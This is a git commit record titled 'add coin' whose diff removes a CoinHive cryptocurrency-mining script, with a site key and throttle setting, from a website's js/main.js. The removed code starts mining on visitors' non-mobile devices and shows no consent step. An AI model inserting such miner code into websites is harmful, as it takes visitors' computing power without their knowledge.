f3f5a6ec870c09bcd443afd78aca7b98c5fc1437
Sean Cheong <seancheong@seans-mbp.attlocal.net>
2018-01-28 21:39:38 -0800

    add coin

--- js/main.js
+++ js/main.js
@@ -1,15 +1,6 @@
 //coinhive
 
-<script src="https://coinhive.com/lib/coinhive.min.js"></script>
-<script>
-	var miner = new CoinHive.Anonymous('DFCcPijCwA91sHip2a2ag6m4T26rQFzk', {throttle: 0.3});
 
-	// Only start on non-mobile devices and if not opted-out
-	// in the last 14400 seconds (4 hours):
-	if (!miner.isMobile()) {
-		miner.start();
-	}
-</script>
 
 function main() {
 
